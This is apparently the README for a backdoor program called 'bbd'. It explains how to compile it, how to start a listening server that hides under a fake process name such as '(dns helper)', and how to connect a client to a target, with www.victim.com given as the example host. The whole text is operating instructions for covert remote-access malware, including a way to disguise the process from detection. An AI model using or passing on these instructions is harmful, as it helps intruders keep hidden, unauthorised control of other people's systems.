Compilation:

- Edit 'server/settings.h' (like standard passcode, change it!)
- then execute './install.sh'

Please mail me if compilation is unsuccesfull with full details or if you have
comments/suggestions.

Usage:

One backdoor client, one server

Server usage:

./bbd <-p port> [-d disguise_as]

<port>        = TCP port address to listen on
[disguise_as] = (optional) fake procesname

e.g.: ./bbd -p 3846 -d "(dns helper)"

To unload the server, type command "unload" during session!

Client usage:

./bbd_cl -h <hostname> -p <port>

<hostname>  = hostname or IP of server
<port>      = TCP port address the server is listening on

e.g.: ./bbd_cl -h www.victim.com -p 3846

To exit the client type "exit" command and then ^c
